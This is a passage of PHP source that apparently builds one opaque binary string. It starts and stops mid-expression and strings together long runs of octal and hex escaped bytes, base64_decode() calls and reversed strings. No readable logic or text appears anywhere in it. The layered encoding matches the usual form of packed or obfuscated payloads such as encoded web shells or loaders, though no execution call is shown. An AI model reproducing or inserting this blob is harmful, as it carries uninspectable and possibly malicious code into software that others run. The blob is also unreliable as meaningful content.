\x1d\x8b\x96\x96\xdb\xa4\xa9\x83\xa5\x24\xd\xbd\xd3\x13\x36\x12\x80\x39\xc\xf3\x5a\xe6\xf9\xc2\x3e\x7f\x1d\xe\x23\xb7\x31\x9e\x74\x8c\x8b\x16\xd2\x42\x9"."\360\310\41\316\43\353\164\143\142\163\135\2\63\124\302\327\36\245\106\177\213\213\373\40\21\42\60\204\334\266\224\270\147\22\347\342\205\155\75\155\16\300\5\350\113\370".base64_decode('xSN3tUT5ixrI3xJBn+R20b1yiY1sC+Gk1k59BwCqN0B4Avy7gH4ggkgyALE1kw==')."\244\67\220\360\325\247\160\333\100\333\370\66\273\3\337\366\202\134\111\233\215\67\51\354\131\0\66\322\140\320\164\125\55\214\274\152\220\322\101\147\311\27\136\232\70\60".base64_decode('i/wQeWoWQQEJzq5iY+qZN9AI/taFBjzgrw/8+EJg1FSWAKw7n3euZwD+wyNKGQ==')."\42\361\165\17\163\6\157\343\0\370\27\120\221\1\157\243\265\260\152\117\250\305\343\301\11\350\67\371\345\111\1\125\41\135\25\274\13\235\345\247\67\25\45\237\247\66".base64_decode('JMEwbUY4XIKQaV80sTQcdurNZNqw6+ElxWPLi8lG4QrWDDASa5oQ+XMBGaKbJw==')."\2\363\226\103\302\165\1\177\163\223\20\256\167\315\367\66\326\321\220\163\2\375\232\100\275\166\270\275\101\200\242\32\72\31\271\23\37\61\214\277\61\357\43\262\263\246"."\231\355\6\344\33\4\4\136\34\162\371\230\374\232\27\133\165\263\327\347\26\157\347\302\204\370\153\34\42\335\144\343\30\107\33\107\303\350\236\56\15\100\224\323\157\64".base64_decode('3WgA4YAGMAJoCKGLBpCzIBpAHaUBKHZ4GmkcEPaAoEYluHZun5yQu9lNs5mxiA==')."\x70\x61\x1c\x52\x62\x7\x56\x9a\x41\x67\x2\x40\x16\x93\x99\x1a\xd2\xa2\x4d\x44\x4a\x27\x41\xe8\xc7\xa6\x87\x92\x70\xe1\x15\xaa\x25\x5\x45\x91\x13\xa7\x0\xcc\x26\x4a\x3\x7e\xdb\x96"."\xcc\x41\xcc\xf0\x12\x3a\x65\xf1\x25\x4b\x23\xa4\x1a\x49\x53\xa5\xe4\x5e\x16\xa8\xd4\x8b\xee\xb5\x9\xd5\x92\xed\x9c\xeb\x8f\xb0\xc6\x37\xac\x9\x4a\x60\xac\x16\x26\x1a\x52\xae\x99\x31".strrev('¯]¶FØ¬r'."\r".'* JFÓüHã³!N³f³°ªË7ğ6oÌ¿#n˜¹Âa-"ŒEK').strrev('.\\Pf©’;~.¸0KC!\\›#Jãs!Úm~aÎûÄDq¢~½$”XI›ì?').base64_decode('C9hUtUqoWoNQvF4JSwWB9JY0dtFktYIUwdyQkukCqf2mCgbClEFUNssxkg+WIg==')."\321\232\221\222\62\155\366\43\4\46\112\62\14\157\24\3\66\50\254\360\366\247\24\135\147\347\5\210\55\240\237\106\202\137\347\24\335\45\271\253\51\256\162\151\43\250"."\44\311\241\237\73\202\114\120\371\355\4\206\70\135\60\115\105\172\77\216\157\354\311\312\222\221\224\344\145\35\27\122\161\240\217\73\106\202\52\67\136\346\42\312\272\362"."\x4e\xf6\xab\x19\xab\x2\x2e\xad\x35\x29\xd9\x94\x8a\x74\x89\x2d\xdc\xca\x9c\xc5\xb\xb9\x91\x31\xbf\xf6\x6b\xc8\xcd\xa5\x41\xd\x4d\x6c\x64\xed\xe5\x34\x31\x75\x87\x87\x26\x8c\xc4\x18"."\x38\x66\x3a\xd\x86\x14\xe5\x15\xac\x7d\x11\x2d\x21\xc5\x66\x89\xd6\x7f\x8c\xa5\x71\x86\xa6\x35\xc8\xe9\xbe\x90\x36\x5f\x55\xc8\x34\x75\xfb\x5b\x1a\x7d\x7e\xea\xef\x85\x3a\x83\xc2\xa1"."\166\162\30\15\204\240\254\203\6\14\372\221\225\111\315\55\164\243\203\213\125\160\21\70\106\234\3\150\60\371\234\164\5\152\352\1\213\32\256\365\2\316\334\263\40\304"."\xb\xa8\x7\x59\x1\xd3\x2b\xc\x93\x0\x6d\xa0\x4e\x10\x0\xc5\x85\xa4\xcd\xa7\xb5\xb3\xc5\xb\x48\x17\x71\xfe\x61\x5a\xc0\x5e\x3f\xc9\xeb\x50\xa0\x95\x3c\xb6\x9d\x86\xb7\x1a\x58\x46"."\xec\xe6\xe2\xbf\x67\x6a\x16\xfc\x68\xd\xb1\x36\xb\xe6\xab\x21\x9\x59\x85\x59\x24\x66\xfc\xf7\xa\x3\xa\x67\xbe\x41\x36\x74\x29\xe1\xbf\x66\xe2\x1e\xdd\x50\x4d\x28\x93\x40\xb7\x2c"."\171\320\4\302\106\336\144\254\23\44\232\173\55\0\304\22\110\25\365\140\247\365\7\132\111\367\365\220\211\376\321\134\144\265\32\262\241\106\235\350\206\23\341\42\146\42"."\x15\xac\x1d\xa1\x8a\x70\x26\x4b\x1\x9\x64\x5f\xf4\x58\x8e\xf8\xd4\xe0\x5a\x7c\x17\xfe\x69\x4d\xc5\xec\xa0\xe1\xe4\xb8\x2d\xa6\x18\xcc\x97\x1\x5c\x65\x2e\x82\x7e\xd8\x66\xe1\x7e\x58"."\x8a\x11\xa8\x1e\xc1\xdd\x90\xdc\xad\xc0\x3b\x8\x94\x55\xcf\x3b\xc8\x24\x5d\xc9\xef\x1c\x73\x5e\x61\x3e\xe9\x9a\xeb\x77\x87\x83\xfe\xe6\x0\xd5\xec\xc1\x30\xba\x63\x16\xf0\xd4\xb4\x32"."\205\33\203\326\272\346\133\41\160\15\204\134\165\5\301\114\252\202\160\304\267\204\3\176\50\134\172\174\265\226\14\301\172\346\371\311\14\13\373\274\215\163\13\106\204\374"."\xe1\x6\x21\xb\x6\x7a\x43\x9e\x6\x2b\xcc\x5c\x42\xd0\x3\xd7\x2f\xf\x57\xfb\xfc\x35\x42\xb4\xd7\x9f\x8f\x9\xc0\x2c\x59\x80\x58\x46\xc5\x40\xc0\x6c\xb7\x2d\x45\x1c\x4a\x25\x60\x54"."\142\3\220\275\265\207\1\167\74\247\155\260\264\244\315\71\307\61\201\11\147\230\236\10\267\244\206\0\353\224\356\127\132\1\160\313\240\100\234\215\204\234\16\7\251\204"."\x7d\x0\xf1\x91\x39\xd0\xa0\x64\x94\xb8\xdb\xb\x62\x57\x3\xa6\x56\x58\xee\xfb\xd2\xab\x87\xe\xab\x77\x2a\x2f\xd6\xaf\x87\x83\xad\x41\x86\x6d\x3c\x15\xb\xc5\x9b\xe6\x17\x4e\x26\x9e"."\204\131\22\203\277\115\142\122\170\124\133\60\241\151\202\232\356\232\211\40\207\252\361\265\300\27\155\114\213\346\240\67\3\216\161\276\315\0\20\341\245\370\61\270\316\365"."\10\144\223\261\213\216\11\41\116\105\156\41\26\261\354\30\4\300\117\155\204\175\205\3\53\250\201\102\253\75\145\217\265\205\352\240\177\245\266\263\131\3\325\254\340\340"."\10\360\225\61\125\270\340\50\107\51\143\220\213\166\322\133\127\210\144\351\366\36\225\242\140\54\363\205\100\216\210\303\62\162\373\21\26\155\24\272\354\272\332\236\266\313"."\311\166\15\60\11\11\152\262\143\227\73\115\361\334\331\126\106\113\252\324\347\111\227\35\124\41\304\341\304\240\160\112\370\341\171\17\163\124\6\3\72\13\211\363\2\221"."\106\166\222\11\11\160\275\145\32\62\40\163\243\26\104\235\250\224\46\23\337\200\265\200\133\213\361\311\114\275\275\361\253\256\160\277\107\356\360\160\320\46\161\117\243\124"."\52\55\314\214\100\11\110\270\175\104\211\106\252\223\37\2\246\72\331\51\126\324\264\211\302\375\212\207\262\302\76\111\334\172\202\270\352\76\172\44\115\356\12\125\367\301".base64_decode('jS6PY4P3TkXPqK6W4GR7fYOrxg5IXwW1NwIbUFsI7EB0Lsk9+mTKF2PIxKlSAg==').base64_decode('IJ9Mknw/ZGPN/vcwELvRAvJaDJ71UY4HQy2TBwM5D4/D2D0LPUJPyKzBsBv4qw==')."\120\275\13\12\326\273\240\120\275\13\54\365\56\310\257\27\203\54\223\124\316\144\152\260\277\317\1\201\232\230\100\121\61\100\51\156\34\236\145\212\47\242\104\62\305\6"."\x4a\xe\x10\xed\xc6\xcc\x5f\x8c\xa5\xd7\xf9\x17\x5b\x8\x71\x61\x89\x98\x8a\x73\x10\xd2\x44\xb2\x3b\xe1\x99\xc\xfe\x4c\xca\xba\x1\x39\xe3\xff\xb\x6f\x79\xf0\x86\x7b\x3\x63\xd7\x19"."\x8f\xe5\xd4\x74\xdd\x9\x3d\x3\x21\xce\x92\x19\x1\xf8\x83\x54\x2b\x67\xee\x13\x3e\x7e\x15\xa4\x43\xe2\xb6\x84\x39\x6e\x63\x6e\xdd\xb8\xef\x37\xac\x4c\xc1\xdf\x1e\x76\x85\x1d\x30\xc8"."\xae\x76\x25\xa8\x40\xd2\x46\xb0\xe2\xe9\xcd\x68\xba\x22\xba\x21\x8c\x29\xc8\x53\x15\xbb\xaa\x28\xf8\xec\x4b\xc9\xbd\x90\xf8\x50\xdb\x8\xc1\x7b\x1f\x75\x6c\x27\xba\x9\x82\x8\xb3\xa7".base64_decode('TN5De+2g6xZvd7qidFJBSGCWmfDaxLzYWbujmpwHcIqYZd4PsdrdXhBgF64BYw==')."\272\40\170\303\4\55\44\225\300\6\223\225\234\100\130\242\242\57\376\71\273\120\377\355\131\356\162\20\214\52\366\123\73\127\351\243\316\373\54\153\301\342\357\257\255\256"."\255\241\55\44\42\314\310\312\361\70\150\266\340\102\314\324\226\137\363\110\110\64\112\343\13\372\40\44\221\210\27\166\146\221\315\200\255\47\314\346\51\162\121\135\140\246"."\xce\x83\x70\x32\x57\xe3\xdc\xd0\x20\x93\x13\x7c\xa5\x8b\xb3\x3\xee\xd3\xcc\x96\x0\x8a\xba\xd8\x11\x24\x25\x10\xc8\x41\x23\x71\xe8\xca\x3c\x26\x2\xf4\xa4\xab\xb5\x18\xd9\xf4\x96\x16"."\x81\x79\x57\x54\x59\x34\xb6\x4\xfc\x96\x16\xd9\x8a\x20\xcb\x84\xc2\x70\xa4\x20\x0\xb5\xa3\xa8\x72\x6c\x9\xfa\x28\x25\xf7\xe1\xfb\x89\xb1\xa6\xe0\x11\x8d\x1f\x66\x10\x21\x77\x8e\x6c".base64_decode('GILubQ7CBlzpFc4KZw9Z/XO6YI3cI7OV4veGAZGjuqiwSGoJESdYF2PqWUsoEQ==')."\156\160\223\342\27\330\135\15\147\333\271\217\302\131\163\172\123\111\211\310\77\125\305\345\216\262\142\211\72\364\256\52\156\16\325\332\247\27\317\231\75\162\126\15\122\312"."\33\112\3\324\252\103\377\217\130\54\235\115\124\147\263\340\142\142\1\247\71\64\124\136\34\57\247\344\176\55\15\66\66\100\217\122\216\50\101\146\63\243\131\334\155\144"."\132\61\172\264\54\71\161\40\344\264\242\154\262\70\157\311\24\241\366\265\370\232\176\45\324\232\321\356\67\147\372\162\151\73\24\216\355\101\321\127\216\305\115\155\231\71"."\x3d\x14\x6f\xcd\xe9\x45\x42\x18\xe5\x24\x22\xc5\x3f\xb1\x5b\xe1\x4a\x49\xf4\x35\x2d\x38\xe5\xb3\x43\xe\x0\xaf\x3c\xaa\x69\x21\x30\x48\x23\x29\x48\x35\xdb\xde\xc\x30\x2\x18\x36\x13"."\xc0\x33\x2d\xed\x85\xa8\xb6\x3\xae\xa\xce\x7f\xb0\xa8\xc0\x66\x6b\x28\x85\x92\x98\x1d\x1a\x5b\xdd\x1c\x5b\xb1\x80\xb2\xc0\xc1\xb5\x8b\xfe\x93\x7b\x1\x4b\xd\xa3\xa1\xe7\x55\x3b\x1c"."\x5f\x3b\xb5\xb5\xce\x8f\xe1\x8b\xba\x60\x53\xa3\x64\xaa\x14\x4a\xd2\x9c\x53\x63\xd6\x2a\xd1\x21\x8f\x3d\x97\xa3\x15\x16\x2c\x54\x64\xf8\x69\x2\xd4\x9\x2f\x2b\xcf\xc4\x7a\x3\x51\xdd".base64_decode('zrhtK/cuaDPzfZeCxStVTKqcMgP8wZDx9IwqlzGq2Cf1bTrGGad0gHs/pn2DAw==')."\156\162\350\52\200\71\32\331\12\247\4\304\224\216\267\326\344\73\233\164\24\113\222\202\33\133\244\166\305\53\11\36\332\206\231\133\340\2\224\64\246\20\153\174\65\115".strrev('ĞÉH„«;¥Èš3‚«m'."\n".'¦qª	Ş‘íZIï\'d‘"_2ô²Èı;H'."\r".'¶ÁK6')."\64\51\45\247\373\10\273\77\116\257\34\247\317\204\25\125\215\163\114\216\353\40\200\43\270\167\67\270\217\160\57\111\330\315\2\211\301\112\146\7\364\271\355\200\233\124"."\x80\x5e\x7a\x6a\x4a\xe6\x98\xbf\xe5\xc\xfa\x26\x2d\x6c\xf2\x35\xd7\x79\x1b\x85\x73\x66\x1\x10\xae\x71\x37\x86\x5d\x4d\x4d\x5\x23\xc8\x48\x60\xd5\x15\x3c\x92\x71\x74\xd0\x27\x5\xa2"."\x74\x56\xcd\x52\x53\xed\x52\x14\x5a\x9d\x56\x15\x41\x68\x91\xa4\x67\xa3\xd4\xc7\x5d\x91\x93\xd0\x51\x94\x80\xb\x48\xb3\x54\x92\xa5\x18\x66\x91\xe2\x60\x9a\xd8\xd1\x17\x8e\x2e\x9e\x3d"."\313\251\316\146\310\346\36\44\262\32\67\252\165\70\317\200\342\222\23\36\341\246\307\303\321\25\217\221\20\264\226\373\213\220\244\131\262\204\361\130\125\14\317\327\342\305"."\122\2\354\307\314\110\145\266\65\163\43\75\265\230\345\224\305\110\270\262\2\32\145\166\231\310\324\315\324\307\5\365\342\256\250\305\121\162\215\234\236\237\237\5\26\356".base64_decode('iIpReCSR2W9+eicS9Z1cOjQ5cjKfGjBFe4EZ4mBPFGTkaCecXnwvIA0gEU1QOg==')."\301\21\46\137\277\206\160\152\6\372\0\52\205\322\151\226\273\60\137\272\24\27\4\267\377\301\301\174\30\261\273\261\106\271\62\252\25\4\247\221\25\6\5\154\16\3"."\233\232\271\32\74\205\305\104\34\102\323\370\32\353\170\6\54\175\360\60\210\134\110\115\332\120\250\155\141\261\143\302\340\240\123\245\7\325\155\105\346\274\16\226\32\207".base64_decode('2xzm9KDlBNUsIQFYU2Lm8Syy8kY6J3ALf3YgLcFT6qqq2QvZUcMiGkc5QLV8Og==')."\35\356\376\204\75\324\302\76\153\32\71\217\313\15\220\105\64\131\146\77\46\64\16\244\50\161\231\375\360\315\351\146\156\267\305\254\370\333\225\311\210\101\352\175\36\251"."\304\223\152\304\311\310\0\126\223\73\242\334\14\236\46\101\104\310\2\207\47\315\226\10\150\2\215\300\335\200\112\2\166\254\303\12\7\145\61\40\373\230\245\107\263\152"."\306\60\21\60\374\314\116\21\162\224\336\41\167\313\70\111\221\104\237\355\50\102\156\141\213\0\301\302\61\204\122\360\246\314\202\224\111\312\52\311\252\42\324\134\75\241"."\50\40\77\242\75\205\52\1\31\213\44\112\66\123\62\303\130\326\320\300\216\310\154\253\311\23\5\315\1\142\250\352\152\44\307\20\204\327\72\143\61\376\35\173\6\235"."\x44\xe8\x4d\x8c\xa4\x92\xc5\xd6\x78\x88\x1c\xa1\x83\xa9\x38\xd7\x66\x91\x17\x13\x9a\x2\xfe\x90\xbf\x86\x3a\x9d\x2f\xa4\xf6\x9a\x4c\x19\x5b\x1d\xdf\x20\xe0\x2\x10\xb5\x94\x9e\xeb\x69"."\x35\xa7\x60\xac\x82\x93\x40\xc8\xf0\x67\x73\xe9\x34\xb3\x7\x80\xbc\x23\xdb\xcf\xf0\xb1\x4e\x30\x91\x33\xf8\x4e\x8\xbd\xc6\x86\xe0\x85\x23\x9d\x80\x5\x37\x4f\xd0\xc9\x94\x12\x73\x98"."\x2\x5\x92\xe1\xf3\x78\x58\x8\x5d\x1f\x26\xd5\x5\x2e\x3e\xa9\x51\xe7\x56\x15\x65\x65\x65\xf6\xb2\x72\xf0\x87\x9d\x38\x12\xe6\xab\xb2\xac\x2c\x2f\x49\x59\x59\x25\xfa\x83\x23\x90\xc2"."\x95\x60\xd1\x1c\x3\x16\x34\xa5\x3c\x24\x41\x8f\xa2\x90\x6\x11\x1a\x9f\x52\xd3\x39\xca\x1f\xd5\x40\x3b\x76\x9\xb6\xac\xaa\x8a\x2c\x2f\x83\x75\x0\x60\x10\x5d\x92\xaa\xa4\x64\x61\xa6"."\40\327\315\224\320\231\26\11\51\126\64\260\303\102\62\50\164\353\200\153\235\176\3\106\5\14\20\102\13\151\61\273\117\1\222\361\241\7\355\360\244\143\104\2\231\211"."\xaf\xab\x54\x89\x95\x39\x28\x7a\x45\xa0\x78\xcc\x64\xaa\x15\xa4\x3\xdb\x67\x94\x35\x18\x2\x4\x5d\x5\xba\x1b\xc6\xae\x5\xa0\x50\x92\xdd\x18\x84\xc1\x46\x96\x14\x3b\x9a\xc6\x77\x1d"."\110\157\13\314\236\204\326\23\346\273\36\14\236\305\102\250\363\120\122\241\123\206\165\223\140\200\322\74\72\105\350\241\64\71\343\106\167\344\72\325\244\351\326\122\130\50".strrev('h®w¼¢­øÕ™0TÆ[ºz#½ÈŸ"ùÔ>±0t·2tm¤&<’ô[').base64_decode('SLhrR3XLwf9iZEEhHgrAZgk1zL2VUIA1ypLHFROeYNK5X6sa5sJOdHaFj3GFww==')."\176\235\70\127\345\347\266\264\214\156\101\200\160\144\262\132\73\300\277\56\366\25\300\233\12\203\131\362\374\224\5\22\261\16\211\351\104\40\264\57\242\257\1\221\251\304"."\x6f\x2b\xc9\xfc\x9d\x32\x21\x29\xdf\x8b\x5\xa0\xd9\xd6\x47\x88\xa8\x61\x1e\xe9\x45\x20\x14\x48\xc4\x93\x7a\x64\x42\x64\x2e\x3\x4a\x3a\x66\x8\x6b\xd9\xaf\xcc\x15\x2a\xa1\x1a\xe4\xe5"."\50\341\246\31\111\306\15\236\240\366\100\324\150\252\32\65\2\200\330\340\7\162\146\170\336\54\43\113\201\222\101\274\160\314\161\357\135\270\232\176\254\241\251\140\347\231"."\xa2\x4a\xd4\xd7\xc2\x8e\x87\x45\x21\x1c\x2e\x97\x7a\xf6\xca\x51\x81\xe9\x62\x9e\x12\x79\x63\x8f\xb4\xb9\xb0\x80\x4a\x46\x2c\x84\x10\x90\x40\x28\x2f\x12\xa3\xed\xed\xca\x29\x94\x7f\x12"."\x28\x8b\x64\x70\xba\x2\xdb\x4\xcd\x69\x13\x59\xcd\x30\xc4\xdb\xb2\x2e\x6a\xb4\x4\x3\x3e\x71\xf7\xc\xe1\x2c\xf6\xd9\xbc\x1e\xd3\xf1\x8e\xe0\x3b\x92\x25\x5\x14\x9c\xd6\x2e\x53\xd2"."\x8d\x6c\x6a\x1c\xc8\xa7\x2d\x67\xfd\x2d\x41\xab\xdd\xd\x22\xd5\x6\x25\xc6\xd4\xe9\x66\x9a\xbd\x44\x0\x87\x33\x28\x98\x3d\x14\xa8\x81\x64\x62\x59\xc8\xe\x92\x55\xa2\x5a\x16\x9\x84"."\302\35\307\264\21\120\332\305\240\117\143\202\60\74\116\120\12\24\1\357\166\13\223\23\316\2\40\242\345\304\233\342\202\317\116\20\22\74\254\12\333\272\275\134\142\374".base64_decode('QBiXjAMThQiUvhBrYFHHCPaPSAIN5iJM823Zrql1pSRumdRGEhaAbhfDHuhiHA==')."\x28\x16\x7a\x9\xe4\x3d\x13\xb3\xa0\x3a\xf3\xb2\xe0\x38\xb8\xcd\x71\x63\x4a\x31\x46\x7\x52\xb\x44\xd5\xd0\x31\x5\xaa\x42\x51\x2\x46\xa3\xcc\x1\x0\xc1\xe\x47\x12\x89\xe8\x53\xa8".base64_decode('aZW9vMI+iShdRTtLsjUS/EJOUpgGkN+lFIzYSZF0PI0mvHaEbuLyS4fo0jEbTw==').base64_decode('dDuZhbLCjqMwGyp0TVckK/yMF5tWwQTNheIxhmC022R5ZkkAVoY5njhfTZlerw==').base64_decode('BPPAZL5gKYS43RUdzKJcvB/ciA+ANOziVUAMP6vGF5ip9SGjSxwc0hgw/7zbwQ==')."\xac\x2f\xc9\xcd\x13\xf2\xac\x50\x49\x29\xbc\x79\x62\xd2\x34\x34\xf4\xb1\x1b\x4\x60\x24\x3b\xe1\xfe\xc8\x4c\xe0\x74\x31\x40\x63\xd9\xe4\xd4\x4d\x1\x6c\x32\x62\xca\xcd\x40\x2c\x55\x8f"."\x42\x2e\x91\x30\x9\xb9\xa9\xbe\xc9\xc9\x40\xd5\x14\x4d\xec\x2e\x28\x11\xa1\xf8\x43\x35\xc4\x98\x8a\xdc\xe2\xe8\x1\x78\xd7\x7a\xc8\x2\xab\xa9\x64\x56\x34\xf4\x35\xcc\x9e\x94\x1a\x95".base64_decode('fP46b43L5/YG50rQYwE/yUdm1ObljjRGeHDozI8wn8Lw0x4BbKE9xnhjnXPBgg==')."\161\215\340\131\337\134\54\236\243\112\66\257\104\300\123\247\314\4\1\345\201\172\260\2\251\223\134\23\44\44\316\144\225\374\364\175\12\172\322\222\267\130\310\220\53\320"."\32\222\276\160\15\140\211\230\123\203\315\132\111\17\325\170\65\335\255\352\52\47\16\64\107\237\130\72\327\364\145\231\13\154\1\351\61\321\313\65\107\66\256\45\337\175".strrev('w$+ç†”¡>Qv'."\0".'WUedÏ†x((ãÿp³ï&·ª+?D˜x¨µtº Œq')."\347\301\260\0\174\342\361\177\135\270\32\343\376\27\54\115\123\143\364\264\233\331\312\143\167\300\65\342\23\63\264\11\171\356\353\377\253\43\174\33\127\325\207\321\55\165"."\372\272\4\172\347\226\234\103\260\63\336\60\276\375\316\253\0\142\123\266\57\43\236\225\70\143\324\101\71\225\332\240\353\27\17\325\223\302\0\347\117\141\162\122\32\254"."\16\113\50\100\136\202\207\6\224\223\245\212\11\260\240\11\332\115\147\205\26\227\376\126\343\70\323\273\216\171\165\100\163\245\241\313\1\371\44\56\263\263\4\122\225\124"."\206\224\101\374\225\7\151\26\275\266\303\253\100\356\36\74\251\214\141\22\302\352\105\343\126\1\305\30\200\270\17\56\271\100\323\13\55\325\227\7\60\311\367\76\332\56"."\x66\x9e\x5\x5d\x4b\xa7\xe3\x9a\x88\x6\x44\x0\xc1\x3e\x82\x9f\x2b\x81\x26\xcb\xf8\xb\x8b\x7d\x36\xc0\x88\x2b\x46\xbe\x5f\x7b\x5c\xce\x90\x85\xea\xd6\x2d\x84\xb3\x33\x80\x28\x4\x13".base64_decode('Wo/5BRIIEZgXE1E21wVjhMmMLm8KV2HoL3QJYHpQQCh9HP5pI7+UyluLxuuaNA==')."\245\224\215\175\215\351\235\151\1\320\240\160\111\14\345\202\347\340\162\232\221\55\342\321\237\275\64\302\227\27\215\23\246\24\172\323\302\75\104\126\13\130\62\173\32\347"."\16\334\371\16\144\166\272\315\116\276\230\125\24\262\116\23\135\250\207\264\220\334\156\303\274\17\244\100\74\124\335\47\176\213\206\200\250\323\40\222\352\104\142\154\6\314"."\x16\x12\xd0\x47\x41\x62\x36\xf4\x62\x5\xa6\x43\xd6\x57\x51\x84\xf5\xc3\x88\x9b\x98\xbb\x3d\xa9\x45\xe4\x64\x0\x9b\xd3\x98\xac\xd5\xb3\x40\x6e\x61\xc6\x72\xa6\x64\x18\xe4\x94\x33\x19".base64_decode('rpy3KOAxkCjjc2kvvhtlgmYFuUg0xcRHEvwCCEkOamvCZxCk22KR9BwI/UDJqQ==')."\126\170\326\320\231\177\156\4\315\175\310\152\27\355\342\310\171\236\103\24\134\110\2\151\226\304\7\330\264\100\341\204\200\253\36\175\240\125\57\62\272\277\2\145\363\320".strrev('{ØlE\'±±Ÿ„š¿Œ÷'."\r".'ˆğö´[ëcÃò‡/&\\Ã×Ä­Çè°nü').strrev('Œ?¹ÒËOÆ“_-!q€†K*†o9[~Ç–HffØ3‰ù™Zşéí~yãb$<')."\x1\xb3\x24\x92\xd7\x61\xa1\x87\xb9\x6c\xd2\x86\xce\xa\x6d\xd4\x17\x8a\x5\x1d\xbc\x57\xe2\xc8\x14\xc0\xe1\x7f\x2f\x3\xdb\x13\x22\xf1\x22\x66\xa6\x3a\x95\xb3\x22\x59\x7a\xc6\x62\x4d"."\xa6\x9a\x66\x1d\x10\xea\xb9\x41\x3b\xf6\x25\x95\xf7\x8c\x41\x6b\x2a\x56\x31\x69\xca\xc\x51\x8c\xe7\xe3\xc3\xcf\x2e\x88\x37\x42\xea\xaa\x12\xff\x90\x1d\x9d\xf\xbc\x24\x54\xe\xc9\x25"."\xf5\x63\x25\x2e\x5f\x14\x69\xb6\xf8\xcc\x7f\xf8\x47\x98\xa2\x66\x92\xfc\xbf\x5b\xa\x9c\x29\xc6\x49\x5\x4b\xcc\xfc\xf7\xc0\xf2\x50\x82\x66\xa5\x60\xb5\x20\x6c\x68\x96\x53\x69\xd\x1e".strrev('·¢¡ì¨&\',ÙYnTËÅ	-iøXV¯èTÏÂë˜ÿãx±¼ë')."\370\24\153\333\21\142\210\42\201\107\13\362\202\130\242\241\131\265\40\60\73\334\250\220\22\316\237\116\222\155\27\336\130\344\213\354\377\156\0\251\110\200\245\7\156\240"."\x50\xa0\xe7\xce\x33\x29\x21\xb1\xbc\xc9\x63\x79\x54\xed\x57\xda\x8d\x99\x2e\x26\xfe\xd8\x65\xfa\xce\xf\x1a\x54\x41\x73\xa6\x18\x7e\x34\xc0\x38\x28\x48\x63\xe6\xbe\x5a\x8a\x7\xd9\x78".base64_decode('GYts0lCJ8rkw4Q0i7thBYLlgbno1aghhllIr/rwKutzCldForZrWreAnTrwrgg==').base64_decode('ChKXQX7RSD9C2ksWLnzMHl8HctWxK0KyYD8CUSe8q6WJ3+b7t37qTwswSSZBCw==').base64_decode('hN2Wp9cQ8bG+x0b7j9Y5p2nCXTOTOMDeITGJB7r1QR7ATonu8UCQzXCyeRKqhw==').base64_decode('THNxbTbra3wZ4aqt5Z1QQVVpfgHUdCUPuiCwLGt60Q/em8TnJzgB9laGvykn/g==')."\xff\xfc\x3a\xdf\xff\xaf\x47\xf9\xa6\x94\x51\xa5\xb2\xe9\xe5\xb6\x3a\xc2\xe0\x92\xd6\xc2\xf3\x1d\x26\x9c\x63\x85\xa6\xa5\x1f\xe6\x2d\x72\x84\x18\x4b\x66\xa8\xcd\x14\x22\x1\xbe\xe0\xe0"."\xde\xe3\xb0\x3c\x86\xea\x60\xb6\x8a\xd4\x65\x5\xf5\x64\x21\xd3\x3\x13\x19\x3e\x49\x94\xa7\xa0\xa4\x4f\x79\x81\x19\xd9\xc9\x5e\x9a\x2a\x14\xc8\x7f\x60\xd1\x34\xf9\x28\xbf\xc9\x9b\x99"."\126\243\235\5\16\340\340\20\370\314\256\4\5\56\41\57\31\247\117\200\231\240\116\72\234\364\53\12\305\54\310\112\122\262\50\336\44\363\147\250\100\126\112\50\361\242"."\63\51\371\100\167\123\11\25\21\51\207\11\224\107\157\102\246\135\320\4\24\321\303\137\45\165\230\337\305\44\71\32\54\17\51\341\104\324\321\120\376\343\225\371\347\261".base64_decode('+bnZYhazQNtNs06GPcZYZn2dsdyeXxk2nYb6hACU+OmERAcO6ECwQB68LIM8zQ==').base64_decode('ENO/8CJkT2kKgjD4EvtLF3NTVkOsmBnKtBqCpZzwMmDeo2UWxT0Qj/hJlqohVw==').base64_decode('oaTbweaGEmT9T2Yq4O6FZ3+NVAZruwaEPZReshGsVgnIpJPSRQfI5pzQDtm8Ug==')."\146\27\112\26\325\262\272\220\214\301\13\245\205\357\302\31\46\154\162\377\255\126\277\255\110\24\306\322\255\111\310\45\307\206\42\110\70\125\3\354\155\314\354\215\31\105"."\42\60\165\374\104\337\202\346\347\102\346\143\71\346\242\62\217\122\345\124\237\20\215\162\121\327\41\340\27\136\66\362\362\333\327\50\32\153\263\135\335\262\101\17\267\254"."\271\232\115\262\204\160\210\27\105\163\307\223\177\116\303\217\217\204\315\237\146\203\302\10\247\265\26\270\100\374\71\265\223\273\371\321\14\347\176\143\61\366\306\247\51\151"."\x8c\xf2\xff\xc\xa\x20\xfc\x39\x50\xc8\xeb\x8\xf7\x17\xb9\xa1\xac\xd2\x63\x7d\x7d\xce\x21\xde\x79\x34\x25\xcc\x87\xf2\xfb\x8d\x42\x7e\xae\xa5\xe7\xdd\x84\xb0\x42\xdd\x47\x4b\xc6\x9c"."\x5d\xbc\x3f\xc9\x26\x15\x7\x61\x57\xbe\xcc\x30\x45\x90\x34\xa0\xc1\x37\xb7\x58\xc1\x5d\x61\x72\x34\xaf\xd2\x7c\x5b\x93\x25\x63\x63\x6\xd2\x20\xf3\x7a\xbb\x9\x6a\x91\x9d\xa0\x56\x82"."\x6e\xe3\x96\x28\x5d\x7c\xbe\xd4\x7c\x36\x27\xa\xf6\xc2\x14\x50\x92\x3e\xa1\x38\xf1\xdc\x6e\xc8\xc\xc1\xc2\x95\xf0\x59\x69\x46\xb1\x70\xb3\x95\x47\xd0\xcd\x4a\x2c\xc5\x44\xec\x58\xc7".strrev('æÏ™’,‚DjzáÖÅëKéùÉAÓâ¦/§ÏÛhuji€ÊH').base64_decode('IZVUVLi91lZRnFolNF5IXnuEw/+QViAPblHBbDgKPbLNeEhT3iFQAPPiKJg3Lw==').base64_decode('mmYWVBtCPkPO6UN0Lx95RMqPFeiwRRbGSYfCZ8HE+dWRGWdNjdQChVvBpXnLAQ==').base64_decode('a6FWFEw8ZCsKPBxMvGgVoLU0pgB15afx+XScxxWwDcBlwj1adM9SIFo0NChsig==').base64_decode('ECi49HWzjYAFLiKG2gsBiY2/qCtYsI4zkfRcujOtsW0ixq26oAUne3eWVZdXmg==')."\171\152\246\163\202\65\146\101\203\132\33\172\216\74\117\222\115\312\124\123\56\330\42\143\251\105\63\324\250\140\247\144\175\200\35\307\323\112\222\202\2\316\242\373\342\322"."\xbe\xe9\x7c\xba\x80\x76\x8\x81\xf0\xa7\x83\x2b\x9d\x4d\x96\xd9\x78\xff\x27\xda\x76\x7c\xe8\x56\x3\xcf\x5c\xd9\x41\xb\x14\xaf\x6c\x78\xbf\xc4\xd1\xf0\x45\x78\x